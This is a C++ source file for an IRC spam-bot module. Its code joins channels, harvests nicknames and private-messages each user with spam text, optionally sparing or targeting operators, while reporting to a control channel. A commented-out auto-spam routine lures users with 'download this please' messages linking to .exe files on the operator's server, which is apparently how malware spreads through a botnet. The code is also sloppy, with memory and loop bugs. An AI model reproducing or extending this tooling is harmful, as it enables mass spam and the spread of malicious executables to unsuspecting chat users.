#include "Spam.h"

Spam::Spam()
{
	ChanCount = -1;
	NumChan = new int(30);
	Channels = new char*[*NumChan];
}

void Spam::SpamSend(char *text, SOCKET sock)
{
	if(send(sock, text, strlen(text), 0) == -1)
	{
		// error
	}
}

char *Spam::SpamRecv(SOCKET sock)
{
	char ping[150];
	char *text = new char[1024];
	memset(text, '\0', 1024);

	if(recv(sock, text, 1024, 0) == 0)
	{
		text = "0";
	}

	if(strstr(text, "PING"))
	{
		for(int n=0; n<1024, text[n]!=0; n++)
		{
			if(text[n]=='P' && text[n+1]=='I' && text[n+2]=='N' && text[n+3]=='G' && text[n+4]==' ' && text[n+5]==':')
			{
				for(int y=0; y<6; n++, y++)
				{
					ping[y]=text[n];
				}
				for(y=6; text[n]!=' ' && text[n]!='\n'; n++, y++)
				{
					ping[y]=text[n];
				}
				ping[y]=0;
				break;
			}
		}
		
		char *a1, *a2;
		std::string p;
		a1 = ping; a2 = ping;
		
		while(*a2 && !strchr(" :", *a2))
			++a2;
		p.assign(a1, a2 - a1);
		if(*a2 != ':')
			a1 = ++a2;
		a1 = ++a2;
		
		char *PiNG = new char[100];
		memset(PiNG, '\0', 100);
		sprintf(PiNG, "PONG :%s\n", a2);
		SpamSend(PiNG, sock); // if recv PING echo PONG !

		text = "0";
	}

	return text;
}

int Spam::GetSpamNick(char ** nicks, char *test)
{
	int j_st, w_fill, c_nick = 0;
	char *oth;

	for(int i = 0; i < strlen(test); i++)
	{
		if(test[i] == '3' && test[i+1] == '5' && test[i+2] == '3')
		{	
			j_st = i;
			w_fill = 0;
			oth = new char[1024];
			strnset(oth, '\0', 1024);

			for(int j = j_st; j < strlen(test); j++)
			{
				oth[w_fill] = test[j];
				w_fill++;
			}
		}
	}

	string nick;
	char *a1, *a2;
	a1 = oth; a2 = oth;

	while(*a2 && !strchr(":", *a2))
		++a2;
	nick.assign(a1, a2 - a1);
	if(*a2 != ':')
		a1 = ++a2;
    a1 = ++a2;

	while(*a2 != ':')
	{
		while(*a2 && !strchr(" ", *a2))
			++a2;
		nick.assign(a1, a2 - a1);
		if(*a2 != isspace(*a2))
			a1 = ++a2;

		char *tmp_nick = new char[strlen(nick.c_str())];
		strnset(tmp_nick, '\0', strlen(nick.c_str()));
		strcpy(tmp_nick, nick.c_str());

		nicks[c_nick] = tmp_nick;
		c_nick++;
	}

	return c_nick;
}

void Spam::StartSpam(SOCKET sock, int delay, char *SpamText, std::string CHN, int num_loop, int op)
{
	char *cinfo = new char[255];
	memset(cinfo, '\0', 255);
	char *JPcom = new char[255];
	memset(JPcom, '\0', 255);
	char *text;

	if(ChanCount == -1)
	{
		sprintf(cinfo, "NOTICE %s :No channel added!\n", CHN.c_str());
		SpamSend(cinfo, sock);
	}
	else
	{
		printf("start spam!!!\n");
		int spam = 0;

		while(spam < num_loop)
		{
			for(int j = 0; j <= ChanCount; j++)
			{
				Sleep(5000);
				printf("Joining: %s\n",  Channels[j]);
				
				sprintf(JPcom, "JOIN %s\n", Channels[j]);
				SpamSend(JPcom, sock);
				
				text = SpamRecv(sock);
				
				sprintf(JPcom, "PART %s\n", Channels[j]);
				SpamSend(JPcom, sock);
				
				const int * c_num_nick = new int(1000);
				char ** p_nicks = new char*[*c_num_nick];

				int NumNick = GetSpamNick(p_nicks, text);
				NumNick -= 4;

				for(int i = 0; i < NumNick; i++)
				{
					DWORD b = 0;
					ioctlsocket(sock, FIONREAD, &b);
					if(b > 0)
					{
						SpamRecv(sock);
					}
					
					char *spamsend = new char[512];
					memset(spamsend, '\0', 512);

					if(op == 0)
					{
						 // ne spamat op
						if(p_nicks[i][0] == '@')
						{
							// op dont spam
						}
						else
						{
							sprintf(spamsend, "PRIVMSG %s :%s\n", p_nicks[i], SpamText);
							printf("SPAMAM: %s\n", p_nicks[i]);
							SpamSend(spamsend, sock);
							Sleep(delay);
						}
					}
					if(op == 1)
					{
						// spamaj op
						if(p_nicks[i][0] == '@')
						p_nicks[i]++;
						sprintf(spamsend, "PRIVMSG %s :%s\n", p_nicks[i], SpamText);
						printf("SPAMAM: %s\n", p_nicks[i]);
						SpamSend(spamsend, sock);
						Sleep(delay);
					}
					
					delete spamsend;
				}
				delete p_nicks;
			}
			spam++;
		}
		
		char *sinfo = new char[255];
		memset(sinfo, '\0', 255);
		sprintf(sinfo, "NOTICE %s :Spm ended!\n", CHN.c_str());
		
		SpamSend(sinfo, sock);
		delete sinfo;
	}

	delete JPcom, cinfo;
}

void Spam::FillSpamChans(char *channel, std::string CHN, SOCKET sock)
{
	char *cinfo = new char[255];
	memset(cinfo, '\0', 255);

	if(ChanCount > 30)
	{
		sprintf(cinfo, "NOTICE %s :Allready added 30 channels!!\n", CHN.c_str());
		SpamSend(cinfo, sock);
	}
	else
	{
		ChanCount++;
		Channels[ChanCount] = channel;

		sprintf(cinfo, "NOTICE %s :Added channel[%i]: %s!\n", CHN.c_str(), ChanCount+1, channel);
		SpamSend(cinfo, sock);
	}
	delete cinfo;
}

void Spam::ShowAddedChannels(SOCKET sock, std::string CHN)
{
	char *cinfo = new char[255];
	memset(cinfo, '\0', 255);

	if(ChanCount == -1)
	{
		sprintf(cinfo, "NOTICE %s :No channel added!\n", CHN.c_str());
		SpamSend(cinfo, sock);
	}
	else
	{
		for(int i = 0; i <= ChanCount; i++)
		{
			sprintf(cinfo, "NOTICE %s :Channel[%i]: %s\n", CHN.c_str(), i+1, Channels[i]);
			SpamSend(cinfo, sock);
		}
	}
	delete cinfo;
}

void Spam::RemoveChannel(SOCKET sock, std::string CHN, int ChanNum)
{
	char *cinfo = new char[255];
	memset(cinfo, '\0', 255);

	if((ChanNum-1) > 30)
	{
		sprintf(cinfo, "NOTICE %s :That channel dont exist!\n", CHN.c_str());
		SpamSend(cinfo, sock);
	}
	else
	{
		for(int i = 0; i <= ChanCount; i++)
		{
			if(i == (ChanNum - 1))
			{
				sprintf(cinfo, "NOTICE %s :Channel[%i] %s removed!\n", CHN.c_str(), i+1, Channels[i]);
				SpamSend(cinfo, sock);

				Channels[i] = "";
			}
			if(i >= (ChanNum - 1))
			{
				Channels[i] = Channels[i+1];
			}	
		}
		
		Channels[ChanCount] = "";
		ChanCount--;
	}

	delete cinfo;
}

void Spam::CloseHttpServer(int port)
{
    SOCKET sock;
	WSADATA wsaData;

	char out[] = "!QUIT!";

	WSAStartup(0x202, &wsaData);
	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);

	struct sockaddr_in addr;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	if(connect(sock, (sockaddr*)&addr, sizeof(addr)) == -1) {
		printf("ERROR CONNECT HTTP! %d\n", WSAGetLastError());
	}
	else {
		printf("CONNECTED\n");

		send(sock, out, strlen(out), 0);
	}
	closesocket(sock);
	WSACleanup();
}

/*void Spam::AutoSpam(SOCKET sock, char *Http_Serv)
{
	int p = 0;
	const int * c_SpmText;
	char ** p_SpmText;

	char ** p_HttpFile;

	char *out, *in;

	const int * c_NumChan;
	char ** p_Chans;

	c_SpmText = new int(10);
	p_SpmText = new char*[*c_SpmText];

	p_HttpFile = new char*[*c_SpmText];

	c_NumChan = new int(30);
	p_Chans   = new char*[*c_NumChan];

	p_SpmText[0]  = "Helo download this please 0: ";   p_HttpFile[0]  = "test0.exe";
	p_SpmText[1]  = "Helo download this please 1: ";   p_HttpFile[1]  = "test1.exe";
	p_SpmText[2]  = "Helo download this please 2: ";   p_HttpFile[2]  = "test2.exe";
	p_SpmText[3]  = "Helo download this please 3: ";   p_HttpFile[3]  = "test3.exe";
	p_SpmText[4]  = "Helo download this please 4: ";   p_HttpFile[4]  = "test4.exe";
	p_SpmText[5]  = "Helo download this please 5: ";   p_HttpFile[5]  = "test5.exe";
	p_SpmText[6]  = "Helo download this please 6: ";   p_HttpFile[6]  = "test6.exe";
	p_SpmText[7]  = "Helo download this please 7: ";   p_HttpFile[7]  = "test7.exe";
	p_SpmText[8]  = "Helo download this please 8: ";   p_HttpFile[8]  = "test8.exe";
	p_SpmText[9]  = "Helo download this please 9: ";   p_HttpFile[9]  = "test9.exe";
	p_SpmText[10] = "Helo download this please 10: ";  p_HttpFile[10] = "test10.exe";

	p_Chans[0] = "#test0";
	p_Chans[1] = "#test1";
	p_Chans[2] = "#test2";
	p_Chans[3] = "#test3";
	p_Chans[4] = "#test4";
	p_Chans[5] = "#test5";
	p_Chans[6] = "#test6";
	p_Chans[7] = "#test7";
	p_Chans[8] = "#test8";
	p_Chans[9] = "#test9";

	while(p == 0)
	{
		for(int i = 0; i <= 9; i++)
		{
			Sleep(2000);

			srand(time(0));
			int rnum = rand() % 10 + 0;
			char *a_sp_text = new char[356];
			strnset(a_sp_text, '\0', 356);
			strcpy(a_sp_text, p_SpmText[rnum]);
			strcat(a_sp_text, Http_Serv);
			strcat(a_sp_text, p_HttpFile[rnum]);
			
			out = new char[256];
			in  = new char[1024];
			
			strnset(out, '\0', 256);
			strnset(in , '\0', 1024);
			
			sprintf(out, "JOIN %s\n", p_Chans[i]);
			SpamSend(out, sock);
			in = SpamRecv(sock);
			
			strnset(out, '\0', 256);
			sprintf(out, "PART %s\n", p_Chans[i]);
			SpamSend(out, sock);
			
			int nn = GetSpamNick(in);

			printf("JOINAL %s\n", p_Chans[i]);
			
			for(int j = 0; j < nn; j++)
			{
				printf("NICK: %s\n", Nicks[j]);

				DWORD b = 0;
				ioctlsocket(sock, FIONREAD, &b);
				if(b > 0)
				{
					char *r = SpamRecv(sock);

					printf("SOMETHING IN SOCK: %s\n", r);

					if(strstr(r, "!stop_auto"))
					{
						printf("STOPING AOUT!");
						p++;
						break;
					}
				}
				
				char *to_nick = new char[512];
				strnset(to_nick, '\0', 512);
				sprintf(to_nick, "PRIVMSG %s :%s\n", Nicks[j], a_sp_text);
				SpamSend(to_nick, sock);

				Sleep(4000);
			}
			
			if(p > 0)
				break;
		}
	}
}*/
